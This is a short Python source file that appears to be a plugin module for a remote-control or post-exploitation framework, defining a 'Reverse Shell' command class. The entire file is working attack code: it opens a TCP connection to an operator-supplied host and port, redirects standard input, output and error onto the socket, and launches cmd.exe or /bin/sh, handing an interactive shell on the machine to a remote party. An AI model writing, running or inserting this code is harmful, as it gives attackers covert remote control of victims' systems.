import socket
import subprocess
import os
from command import Command
import platform

LISTENING_HOST = "lh"
LISTENING_PORT = "lp"

class ReverseShell(Command):
    
    display_name = "Reverse Shell"
    index = {LISTENING_HOST:"Listening Host",
            LISTENING_PORT:"Listening Port"}
    
    def execute(self, args):
        
        success = True
        results = ""
        
        lh = args[LISTENING_HOST]
        lp = args[LISTENING_PORT]
        
        if "Windows" in platform.system():
            shell = ["cmd.exe"]
        else:
            shell = ["/bin/sh","-i"]
        
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((lh,int(lp)))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p=subprocess.call(shell);
        
        return success, results